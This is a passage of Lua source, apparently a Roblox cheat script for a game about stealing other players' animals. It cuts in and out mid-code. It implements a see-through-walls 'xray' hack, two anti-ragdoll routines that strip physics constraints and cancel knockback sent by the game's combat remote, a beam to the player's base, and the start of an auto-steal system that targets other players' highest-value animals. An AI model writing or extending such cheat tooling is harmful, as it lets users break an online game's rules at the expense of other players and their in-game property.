            XrayState.originalTransparency[obj] = obj.LocalTransparencyModifier
            originalTransparency[obj] = XrayState.originalTransparency[obj]
        end
        obj.LocalTransparencyModifier = 0.7
    end
end

local xrayDescConn = Connections.xrayDescConn

local function enableXray()
    XrayState.xrayEnabled = true
    xrayEnabled = XrayState.xrayEnabled

    if Connections.xrayDescConn then
        Connections.xrayDescConn:Disconnect()
        Connections.xrayDescConn = nil
    end

    local descendants = Workspace:GetDescendants()
    for i = 1, #descendants do
        applyBaseWallhack(descendants[i])
    end

    Connections.xrayDescConn = Workspace.DescendantAdded:Connect(function(obj)
        applyBaseWallhack(obj)
    end)
    xrayDescConn = Connections.xrayDescConn

    LocalPlayer.DevEnableMouseLock = true
    LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
end

local function disableXray()
    XrayState.xrayEnabled = false
    xrayEnabled = XrayState.xrayEnabled

    if Connections.xrayDescConn then
        Connections.xrayDescConn:Disconnect()
        Connections.xrayDescConn = nil
    end
    xrayDescConn = Connections.xrayDescConn

    for part, val in pairs(XrayState.originalTransparency) do
        if part and part.Parent then
            part.LocalTransparencyModifier = val
        end
    end
    XrayState.originalTransparency = {}
    originalTransparency = XrayState.originalTransparency
end

if Config.XrayEnabled then
    enableXray()
end

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.5)
    if XrayState.xrayEnabled then
        local descendants = Workspace:GetDescendants()
        for i = 1, #descendants do
            applyBaseWallhack(descendants[i])
        end
    end
end)

RunService.RenderStepped:Connect(function()
    if not XrayState.xrayEnabled then return end
    local cam = Workspace.CurrentCamera
    if cam and cam.CameraSubject and cam.CameraType == Enum.CameraType.Custom then
        cam.CFrame = cam.CFrame
    end
end)

local antiRagdollMode = State.antiRagdollMode

local antiRagdollConn = Connections.antiRagdollConn

local function isRagdolled()

    local char = LocalPlayer.Character; if not char then return false end

    local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return false end

    local state = hum:GetState()

    local ragStates = {

        [Enum.HumanoidStateType.Physics]     = true,

        [Enum.HumanoidStateType.Ragdoll]     = true,

        [Enum.HumanoidStateType.FallingDown] = true,

    }

    if ragStates[state] then return true end

    local endTime = LocalPlayer:GetAttribute("RagdollEndTime")

    if endTime and (endTime - Workspace:GetServerTimeNow()) > 0 then return true end

    return false

end

local function stopAntiRagdoll()

    if Connections.antiRagdollConn then Connections.antiRagdollConn:Disconnect(); Connections.antiRagdollConn = nil end

    antiRagdollConn = Connections.antiRagdollConn

end

local stopAntiRagdollV2 -- forward declaration (definida mais abaixo)

local function startAntiRagdoll(mode)

    stopAntiRagdoll()

    if Config.AntiRagdollV2 and stopAntiRagdollV2 then

        stopAntiRagdollV2()

    end

    if mode == 0 then return end

    Connections.antiRagdollConn = RunService.Heartbeat:Connect(function()

    antiRagdollConn = Connections.antiRagdollConn

        local char = LocalPlayer.Character; if not char then return end

        local hum = char:FindFirstChildOfClass("Humanoid")

        local hrp = char:FindFirstChild("HumanoidRootPart")

        if not hum or not hrp then return end

        if isRagdolled() then

            pcall(function() LocalPlayer:SetAttribute("RagdollEndTime", Workspace:GetServerTimeNow()) end)

            hum:ChangeState(Enum.HumanoidStateType.Running)

            hrp.AssemblyLinearVelocity = Vector3.zero

            if Workspace.CurrentCamera.CameraSubject ~= hum then

                Workspace.CurrentCamera.CameraSubject = hum

            end

            for _, obj in ipairs(char:GetDescendants()) do

                if obj:IsA("BallSocketConstraint") or obj.Name:find("RagdollAttachment") then

                    pcall(function() obj:Destroy() end)

                end

            end

        end

    end)

end

local AntiRagdollV2Data = {

    antiRagdollConns = {},

}

local antiRagdollConns = AntiRagdollV2Data.antiRagdollConns

local cleanRagdollV2Scheduled = false

local function cleanRagdollV2(char)

    if not char then return end

    local carpetEquipped = false

    pcall(function()

        local toolName = Config.TpSettings.Tool or "Flying Carpet"

        local tool = char:FindFirstChild(toolName)

        if tool then

            local hrp = char:FindFirstChild("HumanoidRootPart")

            if hrp then

                for _, obj in ipairs(hrp:GetChildren()) do

                    if obj:IsA("BodyVelocity") or obj:IsA("BodyPosition") or obj:IsA("BodyGyro") then

                        carpetEquipped = true

                        break

                    end

                end

            end

            if not carpetEquipped then

                for _, obj in ipairs(tool:GetChildren()) do

                    if obj:IsA("BodyVelocity") or obj:IsA("BodyPosition") or obj:IsA("BodyGyro") then

                        carpetEquipped = true

                        break

                    end

                end

            end

        end

    end)

    local descendants = char:GetDescendants()

    for _, d in ipairs(descendants) do

        if d:IsA("BallSocketConstraint") or d:IsA("NoCollisionConstraint")

            or d:IsA("HingeConstraint")

            or (d:IsA("Attachment") and (d.Name == "A" or d.Name == "B")) then

            d:Destroy()

        elseif (d:IsA("BodyVelocity") or d:IsA("BodyPosition") or d:IsA("BodyGyro")) and not carpetEquipped then

            d:Destroy()

        end

    end

    for _, d in ipairs(descendants) do

        if d:IsA("Motor6D") then d.Enabled = true end

    end

    local hum = char:FindFirstChildOfClass("Humanoid")

    if hum then

        local animator = hum:FindFirstChild("Animator")

        if animator then

            for _, track in ipairs(animator:GetPlayingAnimationTracks()) do

                local n = track.Animation and track.Animation.Name:lower() or ""

                if n:find("rag") or n:find("fall") or n:find("hurt") or n:find("down") then

                    track:Stop(0)

                end

            end

        end

    end

    task.defer(function()

        pcall(function()

            local pm = LocalPlayer:FindFirstChild("PlayerScripts")

            if pm then pm = pm:FindFirstChild("PlayerModule") end

            if pm then require(pm):GetControls():Enable() end

        end)

    end)

end

local function cleanRagdollV2Debounced(char)

    if cleanRagdollV2Scheduled then return end

    cleanRagdollV2Scheduled = true

    task.defer(function()

        cleanRagdollV2Scheduled = false

        if char and char.Parent then cleanRagdollV2(char) end

    end)

end

local function isRagdollRelatedDescendant(obj)

    if obj:IsA("BallSocketConstraint") or obj:IsA("NoCollisionConstraint") or obj:IsA("HingeConstraint") then return true end

    if obj:IsA("Attachment") and (obj.Name == "A" or obj.Name == "B") then return true end

    if obj:IsA("BodyVelocity") or obj:IsA("BodyPosition") or obj:IsA("BodyGyro") then return true end

    return false

end

local function hookAntiRagV2(char)

    for _, c in ipairs(antiRagdollConns) do pcall(function() c:Disconnect() end) end

    AntiRagdollV2Data.antiRagdollConns = {}

    antiRagdollConns = AntiRagdollV2Data.antiRagdollConns

    local hum = char:WaitForChild("Humanoid", 10)

    local hrp = char:WaitForChild("HumanoidRootPart", 10)

    if not hum or not hrp then return end

    local lastVel = Vector3.new(0, 0, 0)

    local c1 = hum.StateChanged:Connect(function()

        local st = hum:GetState()

        if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll

            or st == Enum.HumanoidStateType.FallingDown or st == Enum.HumanoidStateType.GettingUp then

            local carpetActive = false

            pcall(function()

                local toolName = Config.TpSettings.Tool or "Flying Carpet"

                local tool = char:FindFirstChild(toolName)

                if tool and hrp then

                    for _, obj in ipairs(hrp:GetChildren()) do

                        if obj:IsA("BodyVelocity") or obj:IsA("BodyPosition") or obj:IsA("BodyGyro") then

                            carpetActive = true

                        end

                    end

                end

            end)

            if not carpetActive then

                pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)

            end

            pcall(function() cleanRagdollV2(char) end)

            pcall(function() Workspace.CurrentCamera.CameraSubject = hum end)

            pcall(function()

                local pm = LocalPlayer:FindFirstChild("PlayerScripts")

                if pm then pm = pm:FindFirstChild("PlayerModule") end

                if pm then require(pm):GetControls():Enable() end

            end)

        end

    end)

    table.insert(antiRagdollConns, c1)

    local c2 = char.DescendantAdded:Connect(function(desc)

        if isRagdollRelatedDescendant(desc) then

            cleanRagdollV2Debounced(char)

        end

    end)

    table.insert(antiRagdollConns, c2)

    pcall(function()

        local pkg = ReplicatedStorage:FindFirstChild("Packages")

        if pkg then

            local net = pkg:FindFirstChild("Net")

            if net then

                local applyImp = net:FindFirstChild("RE/CombatService/ApplyImpulse")

                if applyImp and applyImp:IsA("RemoteEvent") then

                    local c3 = applyImp.OnClientEvent:Connect(function()

                        local st = hum:GetState()

                        if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll

                            or st == Enum.HumanoidStateType.FallingDown or st == Enum.HumanoidStateType.GettingUp then

                            pcall(function() hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0) end)

                        end

                    end)

                    table.insert(antiRagdollConns, c3)

                end

            end

        end

    end)

    local c4 = RunService.Heartbeat:Connect(function()

        local st = hum:GetState()

        if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll

            or st == Enum.HumanoidStateType.FallingDown or st == Enum.HumanoidStateType.GettingUp then

            cleanRagdollV2(char)

            local vel = hrp.AssemblyLinearVelocity

            if (vel - lastVel).Magnitude > 40 and vel.Magnitude > 25 then

                hrp.AssemblyLinearVelocity = vel.Unit * math.min(vel.Magnitude, 15)

            end

        end

        lastVel = hrp.AssemblyLinearVelocity

    end)

    table.insert(antiRagdollConns, c4)

    cleanRagdollV2(char)

end

function stopAntiRagdollV2()

    cleanRagdollV2Scheduled = false

    for _, c in ipairs(antiRagdollConns) do pcall(function() c:Disconnect() end) end

    AntiRagdollV2Data.antiRagdollConns = {}

    antiRagdollConns = AntiRagdollV2Data.antiRagdollConns

end

local function startAntiRagdollV2(enabled)

    stopAntiRagdoll()

    stopAntiRagdollV2()

    if not enabled then

        return

    end

    local char = LocalPlayer.Character

    if char then task.spawn(function() hookAntiRagV2(char) end) end

    LocalPlayer.CharacterAdded:Connect(function(c)

        task.spawn(function() hookAntiRagV2(c) end)

    end)

end

if antiRagdollMode > 0 then startAntiRagdoll(antiRagdollMode) end

Config.AntiRagdollV2 = true

startAntiRagdollV2(true)

if Config.AntiRagdollV2 then startAntiRagdollV2(true) end

do

    local plotBeam = nil
    local plotAtt0 = nil
    local plotAtt1 = nil

    local function findMyPlot()
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return nil end
        for _, plot in ipairs(plots:GetChildren()) do
            local sign = plot:FindFirstChild("PlotSign")
            if sign then
                local surfaceGui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
                if surfaceGui then
                    local label = surfaceGui:FindFirstChildWhichIsA("TextLabel", true)
                    if label then
                        local text = label.Text:lower()
                        if text:find(LocalPlayer.DisplayName:lower(), 1, true) or text:find(LocalPlayer.Name:lower(), 1, true) then
                            return plot
                        end
                    end
                end
            end
        end
        return nil
    end

    local function createPlotBeam()
        if not Config.LineToBase then return end
        local myPlot = findMyPlot()
        if not myPlot or not myPlot.Parent then return end
        local character = LocalPlayer.Character
        if not character or not character.Parent then return end
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if not hrp or not hrp.Parent then return end
        if plotBeam then pcall(function() plotBeam:Destroy() end) end
        if plotAtt0 then pcall(function() plotAtt0:Destroy() end) end

        plotAtt0 = Instance.new("Attachment")
        plotAtt0.Name = "PlotBeamAttach_Player"
        plotAtt0.Parent = hrp

        local plotPart = myPlot:FindFirstChild("MainRootPart") or myPlot:FindFirstChildWhichIsA("BasePart")
        if not plotPart or not plotPart.Parent then return end

        plotAtt1 = Instance.new("Attachment")
        plotAtt1.Name = "PlotBeamAttach_Plot"
        plotAtt1.Position = Vector3.new(0, 5, 0)
        plotAtt1.Parent = plotPart

        plotBeam = Instance.new("Beam")
        plotBeam.Name = "PlotBeam"
        plotBeam.Attachment0 = plotAtt0
        plotBeam.Attachment1 = plotAtt1
        plotBeam.FaceCamera = true
        plotBeam.LightEmission = 1
        plotBeam.Color = ColorSequence.new(Color3.fromRGB(80, 140, 255))
        plotBeam.Transparency = NumberSequence.new(0.3)
        plotBeam.Width0 = 0.5
        plotBeam.Width1 = 0.5
        plotBeam.TextureMode = Enum.TextureMode.Wrap
        plotBeam.TextureSpeed = 0
        plotBeam.Parent = hrp
    end

    local function resetPlotBeam()
        if plotBeam then pcall(function() plotBeam:Destroy() end) end
        if plotAtt0 then pcall(function() plotAtt0:Destroy() end) end
        if plotAtt1 then pcall(function() plotAtt1:Destroy() end) end
        plotBeam = nil; plotAtt0 = nil; plotAtt1 = nil
    end

    task.spawn(function()
        local checkCounter = 0
        RunService.Heartbeat:Connect(function()
            if not Config.LineToBase then return end
            checkCounter = checkCounter + 1
            if checkCounter >= 60 then
                checkCounter = 0
                if not plotBeam or not plotBeam.Parent or not plotAtt0 or not plotAtt0.Parent then
                    pcall(createPlotBeam)
                end
            end
        end)
    end)

    LocalPlayer.CharacterAdded:Connect(function(character)

        task.wait(0.5)

        if Config.LineToBase and character then

            pcall(createPlotBeam)

        end

    end)

    if LocalPlayer.Character then

        task.spawn(function()

            task.wait(0.2)

            if Config.LineToBase then createPlotBeam() end

        end)

    end

    _G.createPlotBeam = createPlotBeam

    _G.resetPlotBeam = resetPlotBeam

end

task.spawn(function()

    local Packages = ReplicatedStorage:WaitForChild("Packages")

    local Datas    = ReplicatedStorage:WaitForChild("Datas")

    local Shared   = ReplicatedStorage:WaitForChild("Shared")

    local Utils    = ReplicatedStorage:WaitForChild("Utils")

    local Synchronizer  = require(Packages:WaitForChild("Synchronizer"))

    local AnimalsData   = require(Datas:WaitForChild("Animals"))

    local AnimalsShared = require(Shared:WaitForChild("Animals"))

    local NumberUtils   = require(Utils:WaitForChild("NumberUtils"))

    local autoStealEnabled   = true

    

    

    if Config.DefaultToPriority and Config.DefaultToHighest then

        Config.DefaultToHighest = false

    end

    if Config.DefaultToPriority and Config.DefaultToNearest then

        Config.DefaultToNearest = false

    end

    if Config.DefaultToHighest and Config.DefaultToNearest then

        Config.DefaultToNearest = false

    end

    

    if not Config.DefaultToPriority and not Config.DefaultToHighest and not Config.DefaultToNearest and not Config.DefaultToDisable then

        Config.DefaultToHighest = true

    end

    

    local stealNearestEnabled = false

    local stealHighestEnabled = false

    local stealPriorityEnabled = false

    

    if Config.DefaultToNearest then

        stealNearestEnabled = true

        Config.StealNearest = true

        Config.StealHighest = false

        Config.StealPriority = false

        Config.AutoTPPriority = true

    elseif Config.DefaultToHighest then

        stealHighestEnabled = true

        Config.StealHighest = true

        Config.StealNearest = false

        Config.StealPriority = false

        Config.AutoTPPriority = false

    elseif Config.DefaultToPriority then

        stealPriorityEnabled = true

        Config.StealPriority = true

        Config.StealNearest = false

        Config.StealHighest = false

        Config.AutoTPPriority = true

    elseif Config.DefaultToDisable then

        -- Disable mode: don't activate any steal mode on load

        stealNearestEnabled = false

        stealHighestEnabled = false

        stealPriorityEnabled = false

        Config.StealNearest = false

        Config.StealHighest = false

        Config.StealPriority = false

    else

        stealNearestEnabled = Config.StealNearest

        stealHighestEnabled = Config.StealHighest

        stealPriorityEnabled = Config.StealPriority

        

        if Config.InstantSteal == nil then Config.InstantSteal = false end

        if Config.StealPriority then

            Config.AutoTPPriority = true

        elseif Config.StealNearest then

            Config.AutoTPPriority = true

        elseif Config.StealHighest then

            Config.AutoTPPriority = false

        end

    end

    

    local instantStealEnabled = true

    local instantStealReady = false

    local instantStealDidInit = false

    local selectedTargetIndex = 1

    local selectedTargetUID   = nil 

    local allAnimalsCache    = {}

    local InternalStealCache = {}

    local PromptMemoryCache  = {}

    local activeProgressTween = nil

    local currentStealTargetUID = nil

    local petButtons         = {}

    local ShowPriorityAlert = function() end

    -- ── STEAL REMOTE RESOLVER ─────────────────────────────────────────────

    -- Resolved once and cached. Used in all steal paths for maximum speed.

    

    local function isMyBaseAnimal(animalData)

        if not animalData or not animalData.plot then return false end

        local plots = Workspace:FindFirstChild("Plots")

        if not plots then return false end

        local plot = plots:FindFirstChild(animalData.plot)

        if not plot then return false end

        local channel = Synchronizer:Get(plot.Name)

        if channel then

            local owner = channel:Get("Owner")

            if owner then

                if typeof(owner) == "Instance" and owner:IsA("Player") then return owner.UserId == LocalPlayer.UserId

                elseif typeof(owner) == "table" and owner.UserId then return owner.UserId == LocalPlayer.UserId

                elseif typeof(owner) == "Instance" then return owner == LocalPlayer end

            end

        end

        return false

    end

    

    local function formatMutationText(mutationName)

        if not mutationName or mutationName == "None" then return "" end

        local f = ""

        if mutationName == "Cursed" then f = "<font color='rgb(200,0,0)'>Cur</font><font color='rgb(0,0,0)'>sed</font>"

        elseif mutationName == "Gold" then f = "<font color='rgb(255,215,0)'>Gold</font>"

        elseif mutationName == "Diamond" then f = "<font color='rgb(0,255,255)'>Diamond</font>"

        elseif mutationName == "YinYang" then f = "<font color='rgb(255,255,255)'>Yin</font><font color='rgb(0,0,0)'>Yang</font>"

        elseif mutationName == "Candy" then f = "<font color='rgb(255,105,180)'>Candy</font>"

        elseif mutationName == "Divine" then f = "<font color='rgb(255,255,255)'>Divine</font>"

        elseif mutationName == "Rainbow" then

            local cols = {"rgb(255,0,0)","rgb(255,127,0)","rgb(255,255,0)","rgb(0,255,0)","rgb(0,0,255)","rgb(75,0,130)","rgb(148,0,211)"}

            for i = 1, #mutationName do f = f.."<font color='"..cols[(i-1)%#cols+1].."'>"..mutationName:sub(i,i).."</font>" end

        else f = mutationName end

        return "<font weight='800'>"..f.." </font>"

    end

    -- With inline controls hidden, keep auto-steal active by default.

    if Config.DefaultToDisable then

        Config.DefaultToDisable = false

        SaveConfig()

    end

    -- Safety: if all modes are OFF, fall back to Highest.

    if not stealNearestEnabled and not stealHighestEnabled and not stealPriorityEnabled then

        stealHighestEnabled = true

        Config.StealNearest = false

        Config.StealHighest = true

        Config.StealPriority = false

        SaveConfig()

    end

    local function get_all_pets()

        local out = {}

        for _, a in ipairs(allAnimalsCache) do

            if a.genValue >= 1 and not isMyBaseAnimal(a) then

                table.insert(out, {petName=a.name, mpsText=a.genText, mpsValue=a.genValue,

                    owner=a.owner, plot=a.plot, slot=a.slot, uid=a.uid, mutation=a.mutation, animalData=a, source="CARPET"})

            end

        end

        -- also include conveyor brainrots

        -- (REMOVED: conveyor detection disabled)

        return out

    end

    local screenGui = Instance.new("ScreenGui")

    screenGui.Name = "AutoStealUI"; screenGui.ResetOnSpawn = false; screenGui.Parent = PlayerGui

    local frame = Instance.new("Frame")

    frame.Size = UDim2.new(0, 276, 0, 408)

    frame.Position = UDim2.new(Config.Positions.AutoSteal.X, 0, Config.Positions.AutoSteal.Y, 0)

    frame.BackgroundColor3 = Color3.fromRGB(8,8,10); frame.BackgroundTransparency = 0.18

    frame.BorderSizePixel = 0; frame.ClipsDescendants = true; frame.Parent = screenGui

    

    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)

    for _, d in ipairs(frame:GetDescendants()) do

        if d:IsA("UIStroke") and (d.Name == "_REMOVED_" or d.Parent == frame) then

            d:Destroy()

        end

    end

    

    local header = Instance.new("Frame", frame); header.Size = UDim2.new(1,0,0,14); header.BackgroundTransparency = 1

    MakeDraggable(header, frame, "AutoSteal") 

    local titleLabel = Instance.new("TextLabel", header)

    titleLabel.Size = UDim2.new(0.6,0,1,0)

    titleLabel.Position = UDim2.new(0,15,0,0)

    titleLabel.BackgroundTransparency = 1; titleLabel.Text = ""

    titleLabel.Font = Enum.Font.GothamBlack; titleLabel.TextSize = 16

    titleLabel.TextColor3 = Color3.fromRGB(185,188,215); titleLabel.TextXAlignment = Enum.TextXAlignment.Left

    local ITEM_H, ITEM_PAD, VISIBLE_ROWS = 31, 4, 10

    local LIST_H = ITEM_H * VISIBLE_ROWS + ITEM_PAD * (VISIBLE_ROWS - 1)

    local listFrame = Instance.new("ScrollingFrame", frame)

    listFrame.Size = UDim2.new(1,-12,1,-20); listFrame.Position = UDim2.new(0,6,0,14)

    listFrame.BackgroundTransparency = 1; listFrame.BorderSizePixel = 0

    listFrame.ScrollingDirection = Enum.ScrollingDirection.Y

    listFrame.ScrollBarThickness = 0

    listFrame.ScrollBarImageColor3 = Color3.fromRGB(100,155,255)

    local uiListLayout = Instance.new("UIListLayout", listFrame)

    uiListLayout.Padding = UDim.new(0,ITEM_PAD); uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder

    -- Progress visual is optional (UI removed from panel).

    local progressBarFill = nil

    local function resetProgressVisual()

        if progressBarFill then

            progressBarFill.Size = UDim2.new(0, 0, 1, 0)

            progressBarFill.BackgroundTransparency = 0

        end

    end

    local function setProgressVisualFull()

        if progressBarFill then

            progressBarFill.Size = UDim2.new(1, 0, 1, 0)

            progressBarFill.BackgroundTransparency = 0

        end

    end

    local function runProgressTimer()

        if progressBarFill then

            activeProgressTween = TweenService:Create(

                progressBarFill,

                TweenInfo.new(STEAL_DURATION, Enum.EasingStyle.Linear),

                {Size = UDim2.new(1, 0, 1, 0)}

            )

            activeProgressTween:Play()

            activeProgressTween.Completed:Wait()

        else

            task.wait(STEAL_DURATION)

        end

    end

    local toggleBtnContainer = Instance.new("Frame", frame)

    toggleBtnContainer.Size = UDim2.new(1,-30,0,144); toggleBtnContainer.Position = UDim2.new(0,15,1,-154)

    toggleBtnContainer.BackgroundTransparency = 1

    toggleBtnContainer.Visible = false

    

    local enableBtn = Instance.new("TextButton", toggleBtnContainer)

    local uiScale = 1

    enableBtn.Size = UDim2.new(1,0,0,32*uiScale); enableBtn.BackgroundColor3 = autoStealEnabled and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(14,14,20)

    enableBtn.Text = "ENABLED"; enableBtn.Font = Enum.Font.GothamBold

    enableBtn.TextSize = 13*uiScale; enableBtn.TextColor3 = Color3.fromRGB(185,188,215)

    Instance.new("UICorner", enableBtn).CornerRadius = UDim.new(0, 8)

    

    local nearestBtn = Instance.new("TextButton", toggleBtnContainer)

    nearestBtn.Size = UDim2.new(0.48,0,0,28*uiScale); nearestBtn.Position = UDim2.new(0,0,0,36*uiScale)

    nearestBtn.BackgroundColor3 = Color3.fromRGB(22,22,35)

    nearestBtn.Text = "NEAREST"; nearestBtn.Font = Enum.Font.GothamBold

    nearestBtn.TextSize = 11*uiScale; nearestBtn.TextColor3 = Color3.fromRGB(185,188,215)

    Instance.new("UICorner", nearestBtn).CornerRadius = UDim.new(0, 6)

    local highestBtn = Instance.new("TextButton", toggleBtnContainer)

    highestBtn.Size = UDim2.new(0.48,0,0,28*uiScale); highestBtn.Position = UDim2.new(0.52,0,0,36*uiScale)

    highestBtn.BackgroundColor3 = Color3.fromRGB(22,22,35)

    highestBtn.Text = "HIGHEST"; highestBtn.Font = Enum.Font.GothamBold

    highestBtn.TextSize = 11*uiScale; highestBtn.TextColor3 = Color3.fromRGB(185,188,215)

    Instance.new("UICorner", highestBtn).CornerRadius = UDim.new(0, 6)

    local priorityBtn = Instance.new("TextButton", toggleBtnContainer)

    priorityBtn.Size = UDim2.new(1,0,0,24*uiScale); priorityBtn.Position = UDim2.new(0,0,0,68*uiScale)

    priorityBtn.BackgroundColor3 = Color3.fromRGB(22,22,35)

    priorityBtn.Text = "PRIORITY"; priorityBtn.Font = Enum.Font.GothamBold

    priorityBtn.TextSize = 11*uiScale; priorityBtn.TextColor3 = Color3.fromRGB(185,188,215)

    Instance.new("UICorner", priorityBtn).CornerRadius = UDim.new(0, 6)

    local function attachPet3DPreview(parentBtn, petData, layoutOpts)

        layoutOpts = layoutOpts or {}

        local holder = Instance.new("Frame", parentBtn)

        holder.Size = layoutOpts.Size or UDim2.new(0, 20, 0, 20)

        holder.Position = layoutOpts.Position or UDim2.new(0, 34, 0.5, -10)

        holder.BackgroundColor3 = Color3.fromRGB(22,22,35)

        holder.BackgroundTransparency = 0.05

        holder.BorderSizePixel = 0

        Instance.new("UICorner", holder).CornerRadius = UDim.new(0, layoutOpts.CornerRadius or 5)

        local vp = Instance.new("ViewportFrame", holder)

        vp.Size = UDim2.new(1, 0, 1, 0)

        vp.Position = UDim2.new(0, 0, 0, 0)

        vp.BackgroundTransparency = 1

        vp.BorderSizePixel = 0

        vp.Ambient = Color3.fromRGB(245, 245, 245)

        vp.LightColor = Color3.new(1, 1, 1)

        vp.LightDirection = Vector3.new(-0.45, -0.9, -0.35)

        vp.ImageTransparency = 0

        local failLbl = Instance.new("TextLabel", holder)

        failLbl.Size = UDim2.new(1, 0, 1, 0)

        failLbl.BackgroundTransparency = 1

        failLbl.Text = "3D"

        failLbl.Font = Enum.Font.GothamBlack

        failLbl.TextSize = 9

        failLbl.TextColor3 = Color3.fromRGB(120,122,155)

        failLbl.Visible = true

        local ad = petData and petData.animalData

        local srcModel, srcPart = nil, nil

        local petNameNorm = (petData and petData.petName and tostring(petData.petName):lower()) or ""

        local slotNorm = ad and ad.slot and tostring(ad.slot) or ""

        local forceLiveModelOnly = (petData and petData.ForceLiveModelOnly == true) or (layoutOpts and layoutOpts.ForceLiveModelOnly == true)

        local preferFallbackModelOnly = (petData and petData.ForceFallbackModel == true) or (layoutOpts and layoutOpts.ForceFallbackModel == true)

        local forceEmbeddedAnimation = (petData and petData.ForceEmbeddedAnimation == true) or (layoutOpts and layoutOpts.ForceEmbeddedAnimation == true)

        local function getAnimatorFrom(obj)

            if not obj then return nil end

            local hum = obj:FindFirstChildOfClass("Humanoid")

            if hum then

                return hum:FindFirstChildOfClass("Animator") or hum:FindFirstChildWhichIsA("Animator", true)

            end

            local ac = obj:FindFirstChildOfClass("AnimationController")

            if ac then

                return ac:FindFirstChildOfClass("Animator") or ac:FindFirstChildWhichIsA("Animator", true)

            end

            return obj:FindFirstChildWhichIsA("Animator", true)

        end

        local function ensureAnimatorForPreviewModel(model)

            if not model or not model:IsA("Model") then return nil end

            local animator = getAnimatorFrom(model)

            if animator then return animator end

            local ac = model:FindFirstChildOfClass("AnimationController")

            if not ac then

                ac = Instance.new("AnimationController")

                ac.Name = "PreviewAnimationController"

                ac.Parent = model

            end

            animator = ac:FindFirstChildOfClass("Animator")

            if not animator then

                animator = Instance.new("Animator")

                animator.Parent = ac

            end

            return animator

        end

        local function playEmbeddedPreviewAnimations(model)

            local animator = getAnimatorFrom(model)

            -- Se não tiver animator, tenta criar via ensureAnimatorForPreviewModel

            if not animator then animator = ensureAnimatorForPreviewModel(model) end

            if not animator then return false end

            local any = false

            -- Coleta animações únicas (evita duplicatas)

            local seen = {}

            for _, d in ipairs(model:GetDescendants()) do

                if d:IsA("Animation") and d.AnimationId ~= "" and not seen[d.AnimationId] then

                    seen[d.AnimationId] = true

                    local okLoad, track = pcall(function() return animator:LoadAnimation(d) end)

                    if okLoad and track then

                        pcall(function() track.Looped = true end)

                        pcall(function() track:Play(0.15, 1, 1) end)

                        any = true

                    end

                end

            end

            return any

        end

        local function buildPetPreviewCacheKey()

            if petData and type(petData.previewCacheKey) == "string" and petData.previewCacheKey ~= "" then

                return petData.previewCacheKey

            end

            if petData and type(petData.uid) == "string" and petData.uid ~= "" then

                return petData.uid

            end

            if ad and ad.plot and ad.slot then

                return tostring(ad.plot) .. "|" .. tostring(ad.slot)

            end

            if petNameNorm ~= "" then

                return petNameNorm

            end

            return ""

        end

        local cacheKey = buildPetPreviewCacheKey()

        local function getAnimalsTemplateFolder()

            local root = ReplicatedStorage:FindFirstChild("Models")

            return root and root:FindFirstChild("Animals")

        end

        local function findAnimalModelInFolder(folder, nameKey)

            if not folder or not nameKey or nameKey == "" then return nil end

            local key = tostring(nameKey)

            local inst = folder:FindFirstChild(key)

            if inst and inst:IsA("Model") then return inst end

            local kl = key:lower()

            for _, ch in ipairs(folder:GetChildren()) do

                if ch:IsA("Model") and ch.Name:lower() == kl then

                    return ch

                end

            end

            return nil

        end

        local function resolveTemplateModelFromStorage()

            local folder = getAnimalsTemplateFolder()

            if not folder then return nil end

            local order = {}

            local function push(v)

                if v == nil or v == "" then return end

                local s = tostring(v)

                for _, ex in ipairs(order) do

                    if ex == s then return end

                end

                table.insert(order, s)

            end

            if ad then

                push(ad.Index)

                push(ad.index)

            end

            if petData and petData.petName then

                push(petData.petName)

                -- Tenta normalizar DisplayName → chave do RS (remove espaços)

                local norm = tostring(petData.petName):gsub("%s+", "")

                push(norm)

            end

            for _, key in ipairs(order) do

                local m = findAnimalModelInFolder(folder, key)

                if m then return m end

            end

            -- Busca fuzzy: procura modelo cujo nome contém o petName

            if petData and petData.petName and petData.petName ~= "" then

                local pnl = tostring(petData.petName):lower():gsub("%s+", "")

                for _, ch in ipairs(folder:GetChildren()) do

                    if ch:IsA("Model") then

                        local nl = ch.Name:lower()

                        if nl == pnl or nl:find(pnl, 1, true) or pnl:find(nl, 1, true) then

                            return ch

                        end

                    end

                end

            end

            return nil

        end

        local function findModelByPetNameInPlot(plot, animalData, petNameLower)

            if not plot then return nil end

            local wanted = {}

            local function addWanted(v)

                if v == nil or v == "" then return end

                wanted[tostring(v):lower()] = true

            end

            if animalData then

                addWanted(animalData.Index)

                addWanted(animalData.index)

            end

            addWanted(petNameLower)

            local exact = nil

            for _, d in ipairs(plot:GetDescendants()) do

                if d:IsA("Model") and d ~= plot and d.Name ~= "Base" then

                    local nl = d.Name:lower()

                    if wanted[nl] then

                        exact = d

                        break

                    end

                end

            end

            return exact

        end

        local templateModel = resolveTemplateModelFromStorage()

        local previewObj = nil

        local previewFromCache = false

        local previewFromLiveModel = false

        if not forceLiveModelOnly then

            if templateModel and templateModel.Archivable then

                local ok, cloned = pcall(function() return templateModel:Clone() end)

                if ok then previewObj = cloned end

            end

            if not previewObj and cacheKey ~= "" then

                local tmpl = SharedState.PetPreviewModelCache[cacheKey]

                if tmpl and tmpl.Parent == nil and tmpl.Archivable then

                    local ok, cloned = pcall(function() return tmpl:Clone() end)

                    if ok and cloned then

                        previewObj = cloned

                        previewFromCache = true

                    end

                end

            end

        end

        do

            local plot = ad and ad.plot and Workspace:FindFirstChild("Plots") and Workspace.Plots:FindFirstChild(ad.plot)

            local podiums = plot and plot:FindFirstChild("AnimalPodiums")

            local podium = podiums and ad.slot and podiums:FindFirstChild(tostring(ad.slot))

            if plot then

                srcModel = findModelByPetNameInPlot(plot, ad, petNameNorm)

                local base = podium and podium:FindFirstChild("Base")

                local spawnPart = base and (base:FindFirstChild("Spawn") or base:FindFirstChildWhichIsA("BasePart"))

                if not srcModel then

